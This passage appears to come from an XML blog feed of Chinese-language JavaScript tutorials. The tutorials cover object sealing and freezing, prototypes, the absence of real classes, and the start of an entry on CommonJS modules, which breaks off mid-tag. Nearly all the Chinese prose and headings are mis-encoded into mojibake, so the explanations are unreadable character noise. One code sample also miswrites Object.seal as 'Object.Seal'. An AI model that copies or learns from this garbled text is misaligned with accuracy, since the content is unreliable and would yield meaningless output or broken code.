Object.preventExtensions(..)ã€å¹¶ä¸”å±æ€§æ ‡è®°ä¸º configurable:false</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.Seal( myObject );</span><br></pre></td></tr></table></figure><h4 id="å†»ç»“ï¼ˆFreezeï¼‰"><a href="#å†»ç»“ï¼ˆFreezeï¼‰" class="headerlink" title="å†»ç»“ï¼ˆFreezeï¼‰"></a>å†»ç»“ï¼ˆFreezeï¼‰</h4><p><code>Object.freeze(..)</code></p><p class="tip">Object.freeze(..) åˆ›å»ºä¸€ä¸ªå†»ç»“çš„å¯¹è±¡ï¼Œè¿™æ„å‘³ç€å®ƒå®è´¨ä¸Šåœ¨å½“å‰çš„å¯¹è±¡ä¸Šè°ƒç”¨ Object.seal(..)ï¼ŒåŒæ—¶ä¹Ÿå°†å®ƒæ‰€æœ‰çš„â€œæ•°æ®è®¿é—®â€å±æ€§è®¾ç½®ä¸º writable:falseï¼Œæ‰€ä»¥å®ƒä»¬çš„å€¼ä¸å¯æ”¹å˜ã€‚</p><h3 id="æ··åˆï¼ˆæ·†ï¼‰â€œç±»â€çš„å¯¹è±¡"><a href="#æ··åˆï¼ˆæ·†ï¼‰â€œç±»â€çš„å¯¹è±¡" class="headerlink" title="æ··åˆï¼ˆæ·†ï¼‰â€œç±»â€çš„å¯¹è±¡"></a>æ··åˆï¼ˆæ·†ï¼‰â€œç±»â€çš„å¯¹è±¡</h3><p>åœ¨JavaScriptä¸­æ˜¯å¦å­˜åœ¨ä¸€èˆ¬è¯­è¨€ç±»ä¼¼äºJavaã€C++ç±»çš„æ¦‚å¿µï¼Œè€ŒJavaScriptä¸­çš„åŸå‹åˆæ˜¯ä»€ä¹ˆä¸œè¥¿å‘¢</p><p class="tip">åœ¨JavaScriptä¸­ç±»å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è±¡ä¸­çš„ç±»ï¼ŒJavaScriptè¿˜æ˜¯åŸºäºåŸå‹çš„æ¦‚å¿µè¿›è¡Œè®¾è®¡ï¼Œå°½ç®¡å®ƒçœ‹èµ·æ¥å­˜åœ¨ï¼š<code>new</code>ã€<code>instanceof</code>è¿™äº›è®©ä½ ä»¥ä¸ºå®ƒæ˜¯ç±»çš„ä¸œè¥¿</p><p>åœ¨å¼€å§‹äº†è§£å‰ï¼Œæˆ‘ä»¬å…ˆæ˜ç™½ä»€ä¹ˆæ˜¯ç±»ï¼Ÿ</p><p>ç±»æ˜¯ä¸€ç§äº‹ç‰©çš„æŠ½è±¡ï¼Œæ‹¿å»ºæ±½è½¦æ¥è¯´ï¼Œæ±½è½¦éœ€è¦ï¼š</p><ul><li>è½®èƒ</li><li>å‘åŠ¨æœº</li><li>åè§†é•œç­‰ç­‰â€¦</li></ul><p>æˆ‘ä»¬é€šè¿‡å¯¹æ±½è½¦äº‹ç‰©è¿›è¡ŒæŠ½è±¡ï¼Œé€šè¿‡å®ä¾‹åŒ–äº§ç”Ÿæ–°çš„æ±½è½¦</p><p>å¹¶ä¸”ç±»è¿˜åŒ…å«ç»§æ‰¿ã€å¤šæ€ç­‰æ¦‚å¿µï¼šåŒæ ·å…è®¸çˆ¶ç±»çš„æ³›åŒ–è¡Œä¸ºè¢«å­ç±»è¦†ç›–ï¼Œä»è€Œä½¿å®ƒæ›´åŠ å…·ä½“ã€‚å®é™…ä¸Šï¼Œç›¸å¯¹å¤šæ€å…è®¸æˆ‘ä»¬åœ¨è¦†ç›–è¡Œä¸ºä¸­å¼•ç”¨åŸºç¡€è¡Œä¸º</p><p>ç±»çš„å®ä¾‹åŒ–ä¸Šå°±æ˜¯ä¸€ä¸ªæ‹·è´çš„è¿‡ç¨‹ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190408_13k6cb57lifabic37gi0889i67250_253x333.png" alt=""></p><blockquote><p>JavaScriptä¸­çš„â€ç±»â€</p></blockquote><p class="tip">å½“ä½ â€œç»§æ‰¿â€æˆ–æ˜¯â€œå®ä¾‹åŒ–â€æ—¶ï¼ŒJavaScript çš„å¯¹è±¡æœºåˆ¶ä¸ä¼š è‡ªåŠ¨åœ° æ‰§è¡Œæ‹·è´è¡Œä¸ºã€‚å¾ˆç®€å•ï¼Œåœ¨ JavaScript ä¸­æ²¡æœ‰â€œç±»â€å¯ä»¥æ‹¿æ¥å®ä¾‹åŒ–ï¼Œåªæœ‰å¯¹è±¡ã€‚è€Œä¸”å¯¹è±¡ä¹Ÿä¸ä¼šè¢«æ‹·è´åˆ°å¦ä¸€ä¸ªå¯¹è±¡ä¸­ï¼Œè€Œæ˜¯è¢« é“¾æ¥åœ¨ä¸€èµ·</p><p>åœ¨å…¶ä»–è¯­è¨€ä¸­è§‚å¯Ÿåˆ°çš„ç±»çš„è¡Œä¸ºæ„å‘³ç€æ‹·è´ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹ JS å¼€å‘è€…å¦‚ä½•åœ¨ JavaScript ä¸­ æ¨¡æ‹Ÿ è¿™ç§ ç¼ºå¤± çš„ç±»çš„æ‹·è´è¡Œä¸ºï¼šmixinsï¼ˆæ··åˆï¼‰ã€‚æˆ‘ä»¬ä¼šçœ‹åˆ°ä¸¤ç§â€œmixinâ€ï¼šæ˜ç¡®çš„ï¼ˆexplicitï¼‰ å’Œ éšå«çš„ï¼ˆimplicitï¼‰</p><h2 id="ä¸‰ã€åŸå‹ï¼ˆPrototypeï¼‰"><a href="#ä¸‰ã€åŸå‹ï¼ˆPrototypeï¼‰" class="headerlink" title="ä¸‰ã€åŸå‹ï¼ˆPrototypeï¼‰"></a>ä¸‰ã€åŸå‹ï¼ˆPrototypeï¼‰</h2><h3 id="Object-prototype"><a href="#Object-prototype" class="headerlink" title="Object.prototype"></a>Object.prototype</h3><p>æ¯ä¸ª æ™®é€š çš„ [[Prototype]] é“¾çš„æœ€é¡¶ç«¯ï¼Œæ˜¯å†…å»ºçš„ Object.prototypeã€‚è¿™ä¸ªå¯¹è±¡åŒ…å«å„ç§åœ¨æ•´ä¸ª JS ä¸­è¢«ä½¿ç”¨çš„å…±é€šå·¥å…·ï¼Œå› ä¸º JavaScript ä¸­æ‰€æœ‰æ™®é€šï¼ˆå†…å»ºï¼Œè€Œéè¢«å®¿ä¸»ç¯å¢ƒæ‰©å±•çš„ï¼‰çš„å¯¹è±¡éƒ½â€œè¡ç”Ÿè‡ªâ€ï¼ˆä¹Ÿå°±æ˜¯ï¼Œä½¿å®ƒä»¬çš„ [[Prototype]] é¡¶ç«¯ä¸ºï¼‰Object.prototype å¯¹è±¡ã€‚</p><p>ä½ ä¼šåœ¨è¿™é‡Œå‘ç°ä¸€äº›ä½ å¯èƒ½å¾ˆç†Ÿæ‚‰çš„å·¥å…·ï¼Œæ¯”å¦‚ .toString() å’Œ .valueOf()</p><h3 id="è®¾ç½®ä¸é®è”½å±æ€§"><a href="#è®¾ç½®ä¸é®è”½å±æ€§" class="headerlink" title="è®¾ç½®ä¸é®è”½å±æ€§"></a>è®¾ç½®ä¸é®è”½å±æ€§</h3><p>å¦‚æœç»™ä¸€ä¸ªå¯¹è±¡æ·»åŠ å±æ€§ï¼Œè€Œè¿™ä¸ªå±æ€§æˆ–æ–¹æ³•å·²ç»åœ¨å…¶<code>[[Prototype]]</code>ä¸Šå·²å­˜åœ¨ï¼Œè¿™æ—¶æ˜¯å¦ä¼šå±•ç°å‡ºâ€å¤šæ€â€ç‰¹æ€§ï¼Œå­å±æ€§</p><p>è®©æˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„å®ä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myObject.foo = &quot;bar&quot;;</span><br></pre></td></tr></table></figure><p>æ­£å¦‚æˆ‘ä»¬è¢«æš—ç¤ºçš„é‚£æ ·ï¼Œåœ¨ myObject ä¸Šçš„ foo é®è”½æ²¡æœ‰çœ‹èµ·æ¥é‚£ä¹ˆç®€å•ã€‚æˆ‘ä»¬ç°åœ¨æ¥è€ƒå¯Ÿ myObject.foo = â€œbarâ€ èµ‹å€¼çš„ä¸‰ç§åœºæ™¯ï¼Œå½“ foo ä¸ç›´æ¥å­˜åœ¨ äº myObjectï¼Œä½† å­˜åœ¨ äº myObject çš„ [[Prototype]] é“¾çš„æ›´é«˜å±‚æ—¶ï¼š</p><ul><li>å¦‚æœä¸€ä¸ªæ™®é€šçš„åä¸º foo çš„æ•°æ®è®¿é—®å±æ€§åœ¨ [[Prototype]] é“¾çš„é«˜å±‚æŸå¤„è¢«æ‰¾åˆ°ï¼Œè€Œä¸”æ²¡æœ‰è¢«æ ‡è®°ä¸ºåªè¯»ï¼ˆwritable:falseï¼‰ï¼Œé‚£ä¹ˆä¸€ä¸ªåä¸º foo çš„æ–°å±æ€§å°±ç›´æ¥æ·»åŠ åˆ° myObject ä¸Šï¼Œå½¢æˆä¸€ä¸ª é®è”½å±æ€§ã€‚</li><li>å¦‚æœä¸€ä¸ª foo åœ¨ [[Prototype]] é“¾çš„é«˜å±‚æŸå¤„è¢«æ‰¾åˆ°ï¼Œä½†æ˜¯å®ƒè¢«æ ‡è®°ä¸º åªè¯»ï¼ˆwritable:falseï¼‰ ï¼Œé‚£ä¹ˆè®¾ç½®æ—¢å­˜å±æ€§å’Œåœ¨ myObject ä¸Šåˆ›å»ºé®è”½å±æ€§éƒ½æ˜¯ ä¸å…è®¸ çš„ã€‚å¦‚æœä»£ç è¿è¡Œåœ¨ strict mode ä¸‹ï¼Œä¸€ä¸ªé”™è¯¯ä¼šè¢«æŠ›å‡ºã€‚å¦åˆ™ï¼Œè¿™ä¸ªè®¾ç½®å±æ€§å€¼çš„æ“ä½œä¼šè¢«æ— å£°åœ°å¿½ç•¥ã€‚ä¸è®ºæ€æ ·ï¼Œæ²¡æœ‰å‘ç”Ÿé®è”½ã€‚</li><li>å¦‚æœä¸€ä¸ª foo åœ¨ [[Prototype]] é“¾çš„é«˜å±‚æŸå¤„è¢«æ‰¾åˆ°ã€‚æ²¡æœ‰ foo ä¼šè¢«æ·»åŠ åˆ°ï¼ˆä¹Ÿå°±æ˜¯é®è”½åœ¨ï¼‰myObject ä¸Šã€‚<strong>å¿…é¡»ä½¿ç”¨ Object.defineProperty(..)</strong></li></ul><h3 id="â€œç±»â€"><a href="#â€œç±»â€" class="headerlink" title="â€œç±»â€"></a>â€œç±»â€</h3><p>ç°åœ¨ä½ å¯èƒ½ä¼šæƒ³çŸ¥é“ï¼šâ€œä¸ºä»€ä¹ˆ ä¸€ä¸ªå¯¹è±¡éœ€è¦é“¾åˆ°å¦ä¸€ä¸ªå¯¹è±¡ï¼Ÿâ€ çœŸæ­£çš„å¥½å¤„æ˜¯ä»€ä¹ˆï¼Ÿè¿™æ˜¯ä¸€ä¸ªå¾ˆæ°å½“çš„é—®é¢˜ï¼Œä½†åœ¨æˆ‘ä»¬èƒ½å¤Ÿå®Œå…¨ç†è§£å’Œä½“å‘³å®ƒæ˜¯ä»€ä¹ˆå’Œå¦‚ä½•æœ‰ç”¨ä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»é¦–å…ˆç†è§£ [[Prototype]] ä¸æ˜¯ ä»€ä¹ˆã€‚</p><p>åœ¨ JavaScript ä¸­ï¼Œå¯¹äºå¯¹è±¡æ¥è¯´æ²¡æœ‰æŠ½è±¡æ¨¡å¼/è“å›¾ï¼Œå³æ²¡æœ‰é¢å‘ç±»çš„è¯­è¨€ä¸­é‚£æ ·çš„ç§°ä¸ºç±»çš„ä¸œè¥¿ã€‚JavaScript åªæœ‰ å¯¹è±¡ã€‚</p><p>å®é™…ä¸Šï¼Œåœ¨æ‰€æœ‰è¯­è¨€ä¸­ï¼ŒJavaScript å‡ ä¹æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œä¹Ÿè®¸æ˜¯å”¯ä¸€çš„å¯ä»¥è¢«ç§°ä¸ºâ€œé¢å‘å¯¹è±¡â€çš„è¯­è¨€ï¼Œå› ä¸ºå¯ä»¥æ ¹æœ¬æ²¡æœ‰ç±»è€Œç›´æ¥åˆ›å»ºå¯¹è±¡çš„è¯­è¨€å¾ˆå°‘ï¼Œè€Œ JavaScript å°±æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚</p><p>åœ¨ JavaScript ä¸­ï¼Œç±»ä¸èƒ½ï¼ˆå› ä¸ºæ ¹æœ¬ä¸å­˜åœ¨ï¼‰æè¿°å¯¹è±¡å¯ä»¥åšä»€ä¹ˆã€‚å¯¹è±¡ç›´æ¥å®šä¹‰å®ƒè‡ªå·±çš„è¡Œä¸ºã€‚è¿™é‡Œ ä»…æœ‰ å¯¹è±¡ã€‚</p><h3 id="â€œç±»â€å‡½æ•°"><a href="#â€œç±»â€å‡½æ•°" class="headerlink" title="â€œç±»â€å‡½æ•°"></a>â€œç±»â€å‡½æ•°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">// ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = new Foo();</span><br><span class="line"></span><br><span class="line">Object.getPrototypeOf( a ) === Foo.prototype; // true</span><br></pre></td></tr></table></figure><p>åœ¨é¢å‘ç±»çš„è¯­è¨€ä¸­ï¼Œå¯ä»¥åˆ¶é€ ä¸€ä¸ªç±»çš„å¤šä¸ª æ‹·è´ï¼ˆå³â€œå®ä¾‹â€ï¼‰ï¼Œå°±åƒä»æ¨¡å…·ä¸­å†²å‹å‡ºæŸäº›ä¸œè¥¿ä¸€æ ·ã€‚æˆ‘ä»¬åœ¨ç¬¬å››ç« ä¸­çœ‹åˆ°ï¼Œè¿™æ˜¯å› ä¸ºåˆå§‹åŒ–ï¼ˆæˆ–è€…ç»§æ‰¿ï¼‰ç±»çš„å¤„ç†æ„å‘³ç€ï¼Œâ€œå°†è¡Œä¸ºè®¡åˆ’ä»è¿™ä¸ªç±»æ‹·è´åˆ°ç‰©ç†å¯¹è±¡ä¸­â€ï¼Œå¯¹äºæ¯ä¸ªæ–°å®ä¾‹è¿™éƒ½ä¼šå‘ç”Ÿã€‚</p><p>ä½†æ˜¯åœ¨ JavaScript ä¸­ï¼Œæ²¡æœ‰è¿™æ ·çš„æ‹·è´å¤„ç†å‘ç”Ÿã€‚ä½ ä¸ä¼šåˆ›å»ºç±»çš„å¤šä¸ªå®ä¾‹ã€‚ä½ å¯ä»¥åˆ›å»ºå¤šä¸ªå¯¹è±¡ï¼Œå®ƒä»¬çš„ [[Prototype]] è¿æ¥è‡³ä¸€ä¸ªå…±é€šå¯¹è±¡ã€‚ä½†é»˜è®¤åœ°ï¼Œæ²¡æœ‰æ‹·è´å‘ç”Ÿï¼Œå¦‚æ­¤è¿™äº›å¯¹è±¡å½¼æ­¤é—´æœ€ç»ˆä¸ä¼šå®Œå…¨åˆ†ç¦»å’Œåˆ‡æ–­å…³ç³»ï¼Œè€Œæ˜¯ é“¾æ¥åœ¨ä¸€èµ·ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å½“è¯•å›¾åœ¨ä¸€ä¸ªå¯¹è±¡ä¸Šè¿›è¡Œå±æ€§è®¿é—®ï¼Œè€Œå¯¹è±¡åˆæ²¡æœ‰è¯¥å±æ€§æ—¶ï¼Œå¯¹è±¡å†…éƒ¨çš„ [[Prototype]] é“¾æ¥å®šä¹‰äº† [[Get]] æ“ä½œï¼ˆè§ç¬¬ä¸‰ç« ï¼‰ä¸‹ä¸€æ­¥åº”å½“åˆ°å“ªé‡Œå¯»æ‰¾å®ƒã€‚è¿™ç§å¯¹è±¡åˆ°å¯¹è±¡çš„ä¸²è¡Œé“¾æ¥å®šä¹‰äº†å¯¹è±¡çš„â€œåŸå½¢é“¾â€ï¼ˆå’ŒåµŒå¥—çš„ä½œç”¨åŸŸé“¾æœ‰äº›ç›¸ä¼¼ï¼‰ï¼Œåœ¨è§£æå±æ€§æ—¶å‘æŒ¥ä½œç”¨ã€‚</p><p>æ‰€æœ‰æ™®é€šçš„å¯¹è±¡ç”¨å†…å»ºçš„ Object.prototype ä½œä¸ºåŸå½¢é“¾çš„é¡¶ç«¯ï¼ˆå°±åƒä½œç”¨åŸŸæŸ¥è¯¢çš„é¡¶ç«¯æ˜¯å…¨å±€ä½œç”¨åŸŸï¼‰ï¼Œå¦‚æœå±æ€§æ²¡èƒ½åœ¨é“¾æ¡çš„å‰é¢ä»»ä½•åœ°æ–¹æ‰¾åˆ°ï¼Œå±æ€§è§£æå°±ä¼šåœ¨è¿™é‡Œåœæ­¢ã€‚toString()ï¼ŒvalueOf()ï¼Œå’Œå…¶ä»–å‡ ç§å…±åŒå·¥å…·éƒ½å­˜åœ¨äºè¿™ä¸ª Object.prototype å¯¹è±¡ä¸Šï¼Œè¿™è§£é‡Šäº†è¯­è¨€ä¸­æ‰€æœ‰çš„å¯¹è±¡æ˜¯å¦‚ä½•èƒ½å¤Ÿè®¿é—®ä»–ä»¬çš„ã€‚</p><p>åœ¨ JavaScript ä¸­çš„å…³é”®åŒºåˆ«æ˜¯ï¼Œæ²¡æœ‰æ‹·è´å‘ç”Ÿã€‚å–è€Œä»£ä¹‹çš„æ˜¯å¯¹è±¡æœ€ç»ˆé€šè¿‡ [[Prototype]] é“¾é“¾æ¥åœ¨ä¸€èµ·ã€‚</p><p class="tip">å½“ä¸€ä¸ªå±æ€§/æ–¹æ³•å¼•ç”¨åœ¨ä¸€ä¸ªå¯¹è±¡ä¸Šå‘ç”Ÿï¼Œè€Œè¿™æ ·çš„å±æ€§/æ–¹æ³•åˆä¸å­˜åœ¨æ—¶ï¼Œè¿™ä¸ªé“¾æ¥å°±ä¼šè¢«ä½¿ç”¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ[[Prototype]] é“¾æ¥å‘Šè¯‰å¼•æ“å»é‚£ä¸ªè¢«é“¾æ¥çš„å¯¹è±¡ä¸Šå¯»æ‰¾è¯¥å±æ€§/æ–¹æ³•ã€‚æ¥ä¸‹æ¥ï¼Œå¦‚æœé‚£ä¸ªå¯¹è±¡ä¹Ÿä¸èƒ½æ»¡è¶³æŸ¥è¯¢ï¼Œå°±æ²¿ç€å®ƒçš„ [[Prototype]] æŸ¥è¯¢ï¼Œå¦‚æ­¤ç»§ç»­ã€‚è¿™ç§å¯¹è±¡é—´çš„ä¸€ç³»åˆ—é“¾æ¥æ„æˆäº†æ‰€è°“çš„â€œåŸå½¢é“¾â€ã€‚<br></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ä¸€ã€thiså…³é”®è¯&quot;&gt;&lt;a href=&quot;#ä¸€ã€thiså…³é”®è¯&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ã€thiså…³é”®è¯&quot;&gt;&lt;/a&gt;ä¸€ã€thiså…³é”®è¯&lt;/h2&gt;&lt;p class=&quot;tip&quot;&gt;thisæ˜¯å…³é”®è¯ï¼Œè¡¨ç¤ºæŒ‡å‘çš„ç´¢å¼•ä½ç½®&lt;/p&gt;

&lt;p&gt;å¾ˆå¤šäººå¯¹äºthisæœ€ç»ˆæŒ‡å‘å¸¸è§çš„è¯¯è§£æ˜¯ï¼Œthisæ˜¯ç¼–å†™æ—¶ç»‘å®šçš„ï¼Œé€šå¸¸ä¼šå°†å…¶è®¤ä¸ºæˆä¸€ä¸‹å‡ ç§æƒ…å†µï¼š&lt;/p&gt;
&lt;p&gt;1ã€è®¤ä¸ºthisæŒ‡å‘ï¼Œfooå‡½æ•°&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;foo&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;foo();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>å‰ç«¯æ¨¡å—åŒ–</title>
    <link href="http://zhoushaw.github.io/2019/03/27/learning/font-end/js/module/"/>
    <id>http://zhoushaw.github.io/2019/03/27/learning/font-end/js/module/</id>
    <published>2019-03-27T03:43:35.000Z</published>
    <updated>2019-04-23T15:16:05.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨å­¦ä¹ æ–°ä¸€ä¸ªä¸œè¥¿å‰ï¼Œæœ€å¥½çš„åŠæ³•æ˜¯äº†è§£å®ƒèƒ½ç»™æˆ‘ä»¬å¸¦æ¥ä»€ä¹ˆå¥½å¤„æˆ‘ä»¬ä¸ºä»€ä¹ˆå­¦ä¹ å®ƒï¼Œä»è€Œæ¿€å‘å­¦ä¹ å…´è¶£ï¼Œå“ˆå“ˆå“ˆ~åˆæ‰¯äº†ä¸€å †ï¼Œä¸‹é¢è¿›å…¥æˆ‘ä»¬å‰ç«¯æ¨¡å—åŒ–æ¢ç´¢ä¹‹æ—…å§ã€‚</p><blockquote><p>æ¨¡å—åŒ–çš„å†å²</p></blockquote><p>åœ¨æ­£å¼è¿›å…¥æ¨¡å—åŒ–å­¦ä¹ å‰æˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹å‰ç«¯æ¨¡å—åŒ–çš„å‰ç”Ÿä»Šä¸–ã€‚</p><div><a id="more"></a></div><p>è¿™é‡Œæˆ‘å°±ä¸è¿‡å¤šèµ˜è¿°äº†ï¼Œå¯ä»¥å‚è€ƒç‰ä¼¯å¤§ä½¬çš„<a href="https://github.com/seajs/seajs/issues/547" target="_blank" rel="noopener">å‰ç«¯æ¨¡å—åŒ–å¼€å‘çš„ä»·å€¼</a></p><blockquote><p>æ¨¡å—åŒ–è§„èŒƒ</p></blockquote><p>ç°æœ‰æ¨¡å—åŒ–æ ‡å‡†ï¼š</p><ul><li>CommonJS</li><li>AMD</li><li>CMD</li><li>ES6</li></ul><h2 id="æµè§ˆå™¨åŠ è½½è„šæœ¬"><a href="#æµè§ˆå™¨åŠ è½½è„šæœ¬" class="headerlink" title="æµè§ˆå™¨åŠ è½½è„šæœ¬"></a>æµè§ˆå™¨åŠ è½½è„šæœ¬</h2><blockquote><p>ä¼ ç»Ÿæ–¹æ³•</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- é¡µé¢å†…åµŒçš„è„šæœ¬ --&gt;</span><br><span class="line">&lt;script type=&quot;application/javascript&quot;&gt;</span><br><span class="line">  // module code</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- å¤–éƒ¨è„šæœ¬ --&gt;</span><br><span class="line">&lt;script type=&quot;application/javascript&quot; src=&quot;path/to/myModule.js&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨æ˜¯åŒæ­¥åŠ è½½ JavaScript è„šæœ¬ï¼Œå³æ¸²æŸ“å¼•æ“é‡åˆ°<code>&lt;script&gt;</code>æ ‡ç­¾å°±ä¼šåœä¸‹æ¥ï¼Œç­‰åˆ°æ‰§è¡Œå®Œè„šæœ¬ï¼Œå†ç»§ç»­å‘ä¸‹æ¸²æŸ“ã€‚å¦‚æœæ˜¯å¤–éƒ¨è„šæœ¬ï¼Œè¿˜å¿…é¡»åŠ å…¥è„šæœ¬ä¸‹è½½çš„æ—¶é—´ã€‚</p><p>å¦‚æœè„šæœ¬ä½“ç§¯å¾ˆå¤§ï¼Œä¸‹è½½å’Œæ‰§è¡Œçš„æ—¶é—´å°±ä¼šå¾ˆé•¿ï¼Œå› æ­¤é€ æˆæµè§ˆå™¨å µå¡ï¼Œç”¨æˆ·ä¼šæ„Ÿè§‰åˆ°æµè§ˆå™¨â€œå¡æ­»â€äº†ï¼Œæ²¡æœ‰ä»»ä½•å“åº”ã€‚è¿™æ˜¾ç„¶æ˜¯å¾ˆä¸å¥½çš„ä½“éªŒï¼Œæ‰€ä»¥æµè§ˆå™¨å…è®¸è„šæœ¬å¼‚æ­¥åŠ è½½ï¼Œä¸‹é¢å°±æ˜¯ä¸¤ç§å¼‚æ­¥åŠ è½½çš„è¯­æ³•ã€‚</p><ul><li>deferæ˜¯â€œæ¸²æŸ“å®Œå†æ‰§è¡Œâ€</li><li>asyncæ˜¯â€œä¸‹è½½å®Œå°±æ‰§è¡Œâ€</li></ul><h2 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h2><p><strong>Node.jsæ˜¯commonJSè§„èŒƒçš„ä¸»è¦å®è·µè€…</strong>ï¼Œå®ƒæœ‰å››ä¸ªé‡è¦çš„ç¯å¢ƒå˜é‡ä¸ºæ¨¡å—åŒ–çš„å®ç°æä¾›æ”¯æŒï¼š<strong>module</strong>ã€<strong>exports</strong>ã€<strong>require</strong>ã€<strong>global</strong>ã€‚å®é™…ä½¿ç”¨æ—¶ï¼Œç”¨<strong>module.exports</strong>å®šä¹‰å½“å‰æ¨¡å—å¯¹å¤–è¾“å‡ºçš„æ¥å£ï¼ˆä¸æ¨èç›´æ¥ç”¨<strong>exports</strong>ï¼‰ï¼Œç”¨<strong>require</strong>åŠ è½½æ¨¡å—ã€‚</p><p>æ¯ä¸ªæ–‡ä»¶å°±æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œæœ‰è‡ªå·±çš„ä½œç”¨åŸŸã€‚åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œé¢å®šä¹‰çš„å˜é‡ã€å‡½æ•°ã€ç±»ï¼Œéƒ½æ˜¯ç§æœ‰çš„ï¼Œå¯¹å…¶ä»–æ–‡ä»¶ä¸å¯è§ã€‚</p><h3 id="æ¨¡å—åŒ–"><a href="#æ¨¡å—åŒ–" class="headerlink" title="æ¨¡å—åŒ–"></a>æ¨¡å—åŒ–</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// example.js</span><br><span class="line">var x = 5;</span><br><span class="line">var addX = function (value) &#123;</span><br><span class="line">  return value + x;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>ä¸Šé¢ä»£ç ä¸­ï¼Œå˜é‡xå’Œå‡½æ•°addXï¼Œæ˜¯å½“å‰æ–‡ä»¶example.jsç§æœ‰çš„ï¼Œå…¶ä»–æ–‡ä»¶ä¸å¯è§ã€‚</strong></p><h3 id="globalå¯¹è±¡"><a href="#globalå¯¹è±¡" class="headerlink" title="globalå¯¹è±¡"></a>globalå¯¹è±¡</h3><p>å¦‚æœæƒ³åœ¨å¤šä¸ªæ–‡ä»¶åˆ†äº«å˜é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global.__ENV__ = dev;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç çš„<strong>ENV</strong>å˜é‡ï¼Œå¯ä»¥è¢«æ‰€æœ‰æ–‡ä»¶è¯»å–ã€‚å½“ç„¶ï¼Œéœ€è¦å°½é‡é¿å…å®šä¹‰å…¨å±€å±æ€§</p><h3 id="å¯¼å‡ºæ¨¡å—"><a href="#å¯¼å‡ºæ¨¡å—" class="headerlink" 